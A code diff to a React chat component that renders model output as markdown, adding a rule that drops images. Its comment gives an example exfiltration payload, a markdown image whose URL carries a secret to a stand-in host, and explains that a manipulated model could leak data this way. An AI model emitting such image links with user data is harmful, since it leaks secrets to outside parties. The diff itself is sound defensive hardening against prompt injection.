@@ -11,11 +11,21 @@ const components: Components = {
   ),
 };
 
-/** Model text as markdown; raw HTML is never rendered. */
+/** Images in model text are dropped, never fetched: `![](https://host/?q=secret)` would
+ * otherwise make the browser send whatever the model was talked into putting in the URL.
+ * Cards show catalog photos; chat text needs none. */
+const DISALLOWED = ["img"];
+
+/** Model text as markdown; raw HTML and images are never rendered. */
 export function Markdown({ children }: { children: string }) {
   return (
     <div className={styles.markdown}>
-      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} skipHtml>
+      <ReactMarkdown
+        remarkPlugins={[remarkGfm]}
+        components={components}
+        disallowedElements={DISALLOWED}
+        skipHtml
+      >
         {children}
       </ReactMarkdown>
     </div>
